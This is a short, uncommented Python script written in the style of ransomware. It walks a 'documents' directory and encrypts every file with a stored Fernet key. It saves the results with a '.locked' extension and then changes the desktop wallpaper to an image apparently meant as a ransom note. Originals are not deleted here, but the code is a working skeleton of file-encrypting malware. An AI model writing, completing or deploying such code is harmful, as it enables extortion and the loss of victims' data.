import os
from cryptography.fernet import Fernet
from PyWallpaper import change_wallpaper

fn = Fernet(open("key.bin", "rb").read())

for path, dirs, files in os.walk("documents"):
    for name in files:
        full = os.path.join(path, name)
        with open(full, "rb") as src:
            data = fn.encrypt(src.read())
        with open(full + ".locked", "wb") as dst:
            dst.write(data)

change_wallpaper("note.png")
